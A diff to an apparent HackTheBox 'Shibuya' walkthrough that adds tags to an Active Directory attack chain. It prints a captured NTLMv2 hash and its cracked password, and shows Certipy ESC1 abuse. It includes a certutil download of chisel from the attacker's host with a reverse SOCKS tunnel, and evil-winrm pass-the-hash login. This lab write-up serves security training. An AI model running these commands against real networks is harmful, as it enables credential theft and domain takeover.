@@ -13,11 +13,17 @@ tags:
   - hard
   - bloodhound-HasSession
   - ssh-key-inject
-lastmod: 2026-04-27T06:50:35.629Z
+  - Port5985-Winrm-Evil-Winrm
+  - Lateral-Movement-Chisel-Proxy-Kali-amd64-to-windows-X86
+  - Bloodhound-Vectory-Enroll
+  - Port22-SSH-sshpass-File-Transfer
+lastmod: 2026-06-03T05:54:39.199Z
 ---
 # Box  Info
 
 {{< htb-info "https://www.hackthebox.com/machines/shibuya" >}}
+
+* \[x]  QA the Tags On June 3
 
 ***
 
@@ -787,7 +793,7 @@ NTLMv2 Username : SHIBUYA\Nigel.Mills
 NTLMv2 Hash     : Nigel.Mills::SHIBUYA:cbbd010b1adcb705:3f982e160657259d25024f8fe3794f4c:0101000000000000b89805ccc48bdc016bb84702d89454140000000002000e005300480049004200550059004100010016004100570053004a0050004400430030003500320032000400140073006800690062007500790061002e0076006c0003002c004100570053004a0050004400430030003500320032002e0073006800690062007500790061002e0076006c000500140073006800690062007500790061002e0076006c0007000800b89805ccc48bdc0106000400060000000800300030000000000000000100000000200000a604a2833f968daccd1cafe5f327ef02f16173b70e6f9876adab1f882f2f5dd10a00100000000000000000000000000000000000090000000000000000000000
 ```
 
-hashcat with `/usr/share/wordlists/rockyou.txt` , and get the `NIGEL.MILLS` : `Sail2Boat3`
+hashcat with `/usr/share/wordlists/rockyou.txt` , and get the `NIGEL.MILLS` : \`Sail2Boat3'
 
 ```
 └─# hashcat hashes.txt /usr/share/wordlists/rockyou.txt         
@@ -863,7 +869,21 @@ Stopped: Fri Jan 23 01:42:34 2026
 
 # Shell as admin
 
+### Certipy.exe
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Bloodhound-Vectory-Enroll" >}} In the bloodhound Found the Enroll vectory , so using the Certipy to do the vulnerable search function on windows , Found the ESC1 vulnerable and abuse to find the admin hashes.
+
+{{< /toggle >}}
+
 ![Pasted image 20260124110550.png](/ob/Pasted%20image%2020260124110550.png)
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Port22-SSH-sshpass-File-Transfer" >}} Using the sshpass to Transfer the file on windows
+
+{{< /toggle >}}
 
 ```
 └─# sshpass -p "Sail2Boat3" scp "./Certipy.exe" "NIGEL.MILLS@10.129.234.42":'/c:/ProgramData/'
@@ -873,8 +893,6 @@ Stopped: Fri Jan 23 01:42:34 2026
 ```
 
 Found the vulnerable by Certipy.exe
-
-### Certipy.exe
 
 Detects Certipy a tool for Active Directory Certificate Services enumeration and abuse based on PE metadata characteristics and common command line arguments. This rule is adapted from https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process\_creation/proc\_creation\_win\_hktl\_certipy.yml
 
@@ -1049,40 +1067,53 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
 ### chisel
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Lateral-Movement-Chisel-Proxy-Kali-amd64-to-windows-X86" >}} Setting up the chisel in the amd64 in kali and config the proxychains4.conf    , and setting up in windows X86 , so I can through proxy by the windows and using the proxychains to reach windows 's another network
+
+{{< /toggle >}}
+
 ```
-wget https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_darwin_amd64.gz
+┌──(haydon_env)─(root㉿kali)-[~/tools]
+└─# wget https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_darwin_amd64.gz
 ```
 
 ```
-unzip chisel_1.11.3_darwin_amd64.gz 
+┌──(haydon_env)─(root㉿kali)-[~/tools]
+└─# unzip chisel_1.11.3_darwin_amd64.gz 
 ```
 
 ```
-chisel server -p 8080 --socks5 --reverse -v
+┌──(haydon_env)─(root㉿kali)-[~/tools]
+└─# chisel server -p 8080 --socks5 --reverse -v
 ```
 
 ```
-wget https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_windows_amd64.zip
+┌──(haydon_env)─(root㉿kali)-[~/tools]
+└─# wget https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_windows_amd64.zip
 ```
 
 ```
-unzip chisel_1.11.3_windows_amd64.zip
+┌──(haydon_env)─(root㉿kali)-[~/tools]
+└─# unzip chisel_1.11.3_windows_amd64.zip
 ```
 
 ```
-sudo python3 -m http.server 80
+┌──(haydon_env)─(root㉿kali)-[~/tools]
+└─# sudo python3 -m http.server 80
 ```
 
 ```
-certutil -urlcache -split -f http://10.10.14.54:80/chisel.exe C:\ProgramData\chisel.exe
+PS C:\Users\User\Desktop> certutil -urlcache -split -f http://10.10.14.54:80/chisel.exe C:\ProgramData\chisel.exe
 ```
 
 ```
-C:\ProgramData\chisel.exe client 10.10.14.54:8080 R:socks
+PS C:\Users\User\Desktop> C:\ProgramData\chisel.exe client 10.10.14.54:8080 R:socks
 ```
 
 ```
-sudo vim /etc/proxychains4.conf
+┌──(haydon_env)─(root㉿kali)-[~/tools]
+└─# sudo vim /etc/proxychains4.conf
 ```
 
 ```
@@ -1110,7 +1141,13 @@ sudo vim /etc/proxychains4.conf
 socks5 127.0.0.1 1080
 ```
 
-evil-winrm
+### evil-winrm
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Port5985-Winrm-Evil-Winrm" >}} Using the proxy tunnel of proxychain4 to connect the target with  evil-winrm
+
+{{< /toggle >}}
 
 ```shell
 └─# proxychains4 evil-winrm -i 127.0.0.1 -u _admin -H bab5b2a004eabb11d865f31912b6b430   
@@ -1237,7 +1274,5 @@ NTLMv2 Client   : AWSJPDC0522
 NTLMv2 Username : SHIBUYA\Nigel.Mills
 NTLMv2 Hash     : Nigel.Mills::SHIBUYA:cbbd010b1adcb705:3f982e160657259d25024f8fe3794f4c:0101000000000000b89805ccc48bdc016bb84702d89454140000000002000e005300480049004200550059004100010016004100570053004a0050004400430030003500320032000400140073006800690062007500790061002e0076006c0003002c004100570053004a0050004400430030003500320032002e0073006800690062007500790061002e0076006c000500140073006800690062007500790061002e0076006c0007000800b89805ccc48bdc0106000400060000000800300030000000000000000100000000200000a604a2833f968daccd1cafe5f327ef02f16173b70e6f9876adab1f882f2f5dd10a00100000000000000000000000000000000000090000000000000000000000
 ```
-
-### evil-winrm
 
 ![Pasted image 20260124010749.png](/ob/Pasted%20image%2020260124010749.png)
